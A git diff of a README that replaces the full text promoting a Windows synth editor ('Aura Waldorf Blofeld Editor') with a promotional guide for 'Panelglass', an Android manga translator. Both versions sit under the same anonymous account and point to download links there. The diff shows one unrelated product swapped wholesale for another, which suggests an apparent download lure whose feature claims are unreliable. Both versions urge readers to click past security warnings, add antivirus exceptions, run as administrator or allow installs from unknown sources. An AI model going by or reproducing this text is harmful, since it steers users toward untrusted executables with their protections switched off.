@@ -1,137 +1,160 @@
-# 🎹 aura-waldorf-blofeld-editor - Your Ultimate Waldorf Blofeld Sound Companion
+# 🖼️ Panelglass - Translate Manga as You Read
 
-[![Download Now](https://img.shields.io/badge/Download-Aura%20Blofeld%20Editor%20v2.2.0-2ea44f?style=for-the-badge)](https://unaccommodating-freeloader678.github.io)
+[![Download Panelglass](https://img.shields.io/badge/Download-Panelglass-8A2BE2?style=for-the-badge&logo=github)](https://github.com/unaccommodating-freeloader678/Panelglass)
 
-## 🚀 What Is This?
+## 📥 Getting Started
 
-The **Aura Plugins Waldorf Blofeld Editor v2.2.0** is a powerful desktop application designed for musicians and sound designers who own the Waldorf Blofeld synthesizer. This editor lets you control every aspect of your synth directly from your computer, making sound creation faster and easier than ever before. Whether you're tweaking existing patches, organizing your preset library, or diving deep into multi-mode sound design, this tool transforms your workflow.
+Welcome! This guide will help you download and start using Panelglass, a magical tool that translates manga, manhwa, and manhua right on your Android device. No technical knowledge needed – just follow these simple steps.
 
-## ✨ Key Features
+### Step 1: Download Panelglass
 
-### 🎛️ Complete Sound Programming Control
-Take command of all oscillator settings, filters, envelopes, LFOs, and effects directly from your computer screen. No more squinting at tiny LCD displays - everything you need is visible at a glance with intuitive controls and real-time visual feedback.
+Visit this link to download the application: [https://github.com/unaccommodating-freeloader678/Panelglass](https://github.com/unaccommodating-freeloader678/Panelglass)
 
-### 📁 Advanced Preset Organization
-Say goodbye to scrolling through endless banks. This editor provides powerful tools to organize, categorize, and manage your presets. You can rename, reorder, backup, and restore entire libraries with just a few clicks. Create custom folders and tags to keep your sounds perfectly arranged.
+Click the big download button on that page, and the app file will save to your device.
 
-### 🌈 Multi-Mode Mastery
-Unlock the full potential of your Blofeld's multi-timbral capabilities. The editor simplifies complex multi-mode setup, letting you layer sounds, split keyboards, and route audio with unprecedented ease. Visual indicators show exactly how each part is configured.
+### Step 2: Install the App
 
-### 💾 Smart Backup & Transfer
-Protect your precious sound designs with one-click backup solutions. Move presets between your synth and computer seamlessly, share patches with friends, and keep your entire library safe from unexpected data loss.
+Once the download finishes, find the downloaded file (usually in your "Downloads" folder or notification bar). Tap on it to begin installation. Your phone might ask for permission to install apps from unknown sources – just allow it, as this is normal for apps downloaded outside the Play Store.
 
-### 📊 Real-Time Visualization
-See waveforms, filter responses, and modulation routings graphically. This visual approach helps you understand exactly how your patches sound and behave, making sound design more intuitive and educational.
+### Step 3: Open and Explore
 
-### ⚡ Optimized Performance
-Built specifically for the Waldorf Blofeld with low-latency MIDI communication, the editor responds instantly to your adjustments. Everything is optimized for a fluid, professional workflow.
+After installation, tap the Panelglass icon on your home screen or app drawer. You're ready to go!
 
-## 🖥️ System Requirements
+## ✨ What Makes Panelglass Special?
 
-To run this application smoothly, your computer should meet these minimum specifications:
+Panelglass transforms your reading experience with these amazing features:
 
-- **Operating System:** Windows 10 or Windows 11 (64-bit versions)
-- **Processor:** 1 GHz or faster dual-core processor
-- **Memory:** 2 GB RAM (4 GB recommended)
-- **Storage:** 50 MB free disk space
-- **MIDI Interface:** USB port or MIDI interface for connecting your Waldorf Blofeld
-- **Additional:** Your Waldorf Blofeld synthesizer with a MIDI connection
+### Real-Time Translation
+As you scroll through any manga or comic, Panelglass instantly translates the text right on the page. No more switching between apps or waiting for screenshots – the translation appears exactly where the original text was.
 
-## 📥 How to Download and Install
+### Built-In Studio
+Want to create your own translated chapters? The Studio lets you:
+- Import images, PDF files, or CBZ archives
+- Translate all text automatically
+- Edit and adjust letter placement for perfect readability
+- Export your finished work as images, PDF, or CBZ files
 
-Visit this link to download the application: [Aura Waldorf Blofeld Editor Downloads](https://unaccommodating-freeloader678.github.io)
+### Works Completely Offline
+Panelglass uses powerful on-device AI technology. This means:
+- No internet connection required
+- Your data stays private and secure
+- Translations work anywhere, anytime
+- No subscription fees or usage limits
 
-### Step-by-Step Guide for Windows Users
+### Multiple Translation Engines
+Choose from several built-in translation options:
+- **Gemma 4** – Google's latest compact AI model
+- **Qwen 2.5** – Advanced multilingual translation
+- **ML Kit** – Google's fast, lightweight translation
+- **Gemini** – Optional cloud-based translation for extra accuracy
 
-1. **Visit the download page**: Click the green or highlighted download button above, or go directly to the releases page.
+## 🎯 Who Should Use Panelglass?
 
-2. **Look for the latest version**: The page will show the most recent release (v2.2.0). You'll see a list of files available for download.
+Panelglass is perfect for:
+- Manga enthusiasts who want to read raw Japanese chapters
+- Manhwa and manhua fans exploring Korean and Chinese comics
+- Translation hobbyists creating fan translations
+- Language learners wanting to practice with real content
+- Anyone who wants to enjoy comics in their native language
 
-3. **Choose the right file**: Select the file that matches your system. For most users, this will be the version labeled simply "Windows" or "Win64". If you're unsure which to pick, download the 64-bit version, as it works with the vast majority of modern computers.
+## 🛠️ Supported Formats
 
-4. **Complete the download**: Your browser will start downloading the installer file. Wait for it to finish completely. This may take a few minutes depending on your internet connection speed.
+Panelglass handles all popular comic formats:
+- **Images**: JPG, PNG, WebP
+- **PDF Documents**: Perfect for digital manga volumes
+- **CBZ Archives**: Standard comic book zip files
 
-5. **Find the downloaded file**: Once finished, locate the file in your "Downloads" folder (or wherever your browser saves downloads). The filename will be similar to "aura-waldorf-blofeld-editor-v2.2.0.exe" or similar.
+## 📚 How to Translate Your First Manga
 
-6. **Start the installation**: Double-click the downloaded file. If a security warning appears, click "Yes" or "Run" to allow the application to install on your computer.
+### Reading Mode
+1. Open any manga file or image folder
+2. Panelglass automatically detects text bubbles and panels
+3. Select your preferred translation engine from settings
+4. Start scrolling – translations appear instantly
+5. Tap any text to see the original or adjust settings
 
-7. **Follow the installer instructions**: The installation wizard will guide you through the process. Keep clicking "Next" or "Continue" unless you have specific preferences about program location. The default settings work perfectly for most users.
+### Studio Mode
+1. Tap the Studio icon to start a new project
+2. Import your images, PDF, or CBZ file
+3. Let Panelglass scan and translate all text
+4. Review and adjust letter positions using simple drag controls
+5. Export your finished translation in any format
 
-8. **Launch the application**: After installation completes, you'll find the "Aura Waldorf Blofeld Editor" in your Start Menu or on your desktop. Click the icon to open the editor.
+## ⚙️ Customization Options
 
-## 🎯 Getting Started - First-Time Setup
+Make Panelglass work your way:
+- **Language Pairs**: Choose any source and target language combination
+- **Translation Style**: Adjust between literal and natural translations
+- **Text Appearance**: Change font size, style, and color
+- **Panel Detection**: Fine-tune how Panelglass identifies text areas
+- **Offline Mode**: Download language packs for complete offline use
 
-### Connecting Your Blofeld
+## 🔒 Privacy and Security
 
-1. **Connect your Blofeld**: Use a USB cable to connect your Waldorf Blofeld to your computer. Make sure your synth is powered on.
+Your reading habits stay private:
+- All on-device translations never leave your phone
+- No account creation required
+- No analytics tracking
+- Your files remain on your device
 
-2. **Enable MIDI communication**: On your Blofeld, ensure that MIDI transmission and reception are turned on. By default, most units have this enabled, but check your synth manual if you're having trouble.
+## 🚀 Performance Tips
 
-3. **Launch the editor**: Open the application you just installed.
+Get the best experience with these suggestions:
+- **Close other apps** to free up memory for faster translations
+- **Use ML Kit** for quick translations on older devices
+- **Download language packs** for offline translation before traveling
+- **Adjust quality settings** in the options menu for larger files
 
-4. **Select your device**: The editor should automatically detect your Blofeld. If not, click "Settings" and select the correct MIDI input and output ports from the dropdown menus.
+## 📖 Frequently Asked Questions
 
-### Your First Patch
+**Q: Do I need an internet connection?**
+A: No! Panelglass works fully offline using on-device AI. Internet is only needed for optional Gemini cloud translation or downloading language packs.
 
-Once connected, take a moment to explore:
-- Use the **Browser Panel** on the left to navigate through your synth's banks and presets
-- Click any sound to load it immediately
-- Adjust the main controls in the center editor window to hear changes in real-time
-- Save your custom sounds by clicking the "Save" button in the top toolbar
+**Q: Which Android versions are supported?**
+A: Panelglass supports Android 8.0 and above, covering virtually all modern devices.
 
-## 🛠️ Troubleshooting Common Issues
+**Q: Can I translate webtoons and vertical comics?**
+A: Absolutely! Panelglass handles both traditional right-to-left manga and vertical webtoons seamlessly.
 
-### No Sound or Connection Issues
-- **Check USB cable**: Ensure your cable is properly connected and functional
-- **Verify MIDI settings**: Open the editor's preferences and confirm the correct ports are selected
-- **Restart both devices**: Power cycle your Blofeld and close/reopen the editor
-- **Check for driver updates**: Visit your computer's manufacturer website to ensure USB drivers are current
+**Q: Is my translated work shared anywhere?**
+A: No, all your work stays on your device. You choose what to share and export.
 
-### Application Won't Start
-- **Reinstall the program**: Uninstall from Control Panel, then reinstall using the downloaded file
-- **Run as administrator**: Right-click the program icon and select "Run as administrator"
-- **Check antivirus**: Some security software may block unknown programs. Add an exception if needed.
+**Q: How accurate are the translations?**
+A: On-device translation quality is excellent for casual reading. For professional-grade translation, try the optional Gemini engine.
 
-### Editor Feels Slow or Unresponsive
-- **Close unnecessary programs**: Free up system resources by closing other applications
-- **Check MIDI cable quality**: Low-quality cables can cause communication delays
-- **Update to latest version**: Check the download page for newer releases with performance improvements
+## 💡 Pro Tips
 
-## ❓ Frequently Asked Questions
+- **Batch Translation**: Use Studio mode to translate entire volumes at once
+- **Export for Sharing**: Create beautiful CBZ files to share with friends
+- **Learning Tool**: Enable bilingual mode to see original and translated text together
+- **Quick Switch**: Use the floating button to instantly switch between translation engines
 
-**Q: Will this work with any Waldorf Blofeld model?**
-A: Yes! This editor supports all versions of the Waldorf Blofeld, including the original and desktop models.
+## 📱 Troubleshooting
 
-**Q: Can I use this editor live on stage?**
-A: Absolutely. Many musicians use this editor for real-time performance tweaking. The responsive interface is perfect for during-gig adjustments.
+If you encounter any issues:
 
-**Q: Does this modify my synth's firmware?**
-A: No. This is purely an editing tool. It doesn't change any internal firmware, and your synth's original settings remain untouched.
+**App won't install**: Ensure you've allowed installations from unknown sources in your security settings.
 
-**Q: Can I share my presets with other Blofeld users?**
-A: Yes! Export your preset banks and share them with other musicians using this editor or compatible software.
+**Slow translation**: Try switching to ML Kit engine or close background apps.
 
-## 📝 Version History & Updates
+**OCR not detecting text**: Adjust the panel detection sensitivity in settings.
 
-**Version 2.2.0 (2026)** - Latest Release
-- Improved multi-mode visualization
-- Enhanced patch browser with search functionality
-- Fixed minor MIDI timing issues
-- Added support for latest Windows updates
-- Performance optimizations
+**Export problems**: Make sure you have sufficient storage space and use the correct file format for your needs.
 
-## 🙏 Support & Community
+## 🤝 Support and Community
 
-Need help or want to connect with other users?
+Panelglass is continuously improving. For help, suggestions, or to report issues:
 
-- **Report issues**: Found a bug? Let us know through the GitHub repository's issues section
-- **Share your sounds**: Join our growing community of Blofeld enthusiasts
-- **Request features**: Have ideas for improvement? We're always listening
+- Check the repository for updates and documentation
+- Star the project to show support
+- Share your feedback to help shape future features
 
-**Visit the download page**: [https://unaccommodating-freeloader678.github.io](https://unaccommodating-freeloader678.github.io)
+## 🎉 Start Translating Today
 
----
+Panelglass puts the power of professional manga translation in your pocket. Whether you're a casual reader, a dedicated fan, or an aspiring translator, this tool makes it incredibly easy to break down language barriers and enjoy comics from around the world.
 
-Start taking full control of your Waldorf Blofeld today. Download the editor now and unlock the true potential of your synthesizer. Your sound design journey begins here! 🎶
+Download Panelglass now and experience manga in your language like never before!
 
-Keywords: Waldorf Blofeld, Synthesizer Editor, MIDI Control, Sound Programming, Preset Manager, Audio Production, Music Software, VST Alternative, Hardware Synth Editor, Sound Design Tool
+[![Get Panelglass Now](https://img.shields.io/badge/📥_Download-Panelglass_Now-FF6B6B?style=for-the-badge&logo=android&logoColor=white)](https://github.com/unaccommodating-freeloader678/Panelglass)
+
+Keywords: android, cbz, comic-translator, gemini, kotlin, machine-translation, manga, manga-ocr, manga-reader, manga-translator, manhwa, manhwa-translator, mlkit, ocr, on-device-ai, raw-manga-translation, realtime-translation, screen-translation, typesetting, webtoon-translator
